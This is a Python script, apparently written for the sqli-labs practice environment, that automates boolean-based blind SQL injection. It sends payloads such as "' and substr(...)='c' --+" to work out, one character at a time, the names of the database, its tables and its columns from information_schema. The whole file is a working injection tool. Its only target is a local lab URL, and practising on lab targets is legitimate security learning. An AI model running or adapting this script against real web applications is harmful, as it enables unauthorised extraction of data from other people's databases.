"""
 * @Author whale4u
 * @Date 2021/4/30
 * @Version 1.0
 """

import string

import requests


class GetInject:
    # mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举
    chr_str = string.ascii_lowercase + string.punctuation + string.digits

    def __init__(self, url, mark, obj):
        """
        obj参数举例:
        obj = "database()"
        obj = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
        """
        self.url = url
        self.mark = mark
        self.obj = obj

    def get_length(self):
        payload_len = "' and length({0})={1} --+"
        # 如果实例参数是双引号型或者整数型，记得把改payload格式
        i = 1
        while True:
            payload_len_i = payload_len.format(self.obj, i)
            r = requests.get(self.url + payload_len_i)
            if self.mark in r.text:
                print("len", i)
                return i
            i += 1

    def get_name(self):
        name_len = self.get_length()
        payload_name = "' and substr({0},{1},1)='{2}' --+"
        output = ''
        for i in range(1, name_len + 1):
            for c in self.chr_str:  # 直接枚举
                payload_name_i = payload_name.format(self.obj, i, c)
                r = requests.get(url + payload_name_i)
                if self.mark in r.text:
                    output += c
                    print(output)
                    break
        return output


# mark 是判断为True还是False的标志，这里是you are in
url = "http://127.0.0.1:8081/Less-1/?id=1"
mark = "Dumb"
obj_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
obj_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database())"

test1 = GetInject(url, mark, obj_c)
test1.get_name()
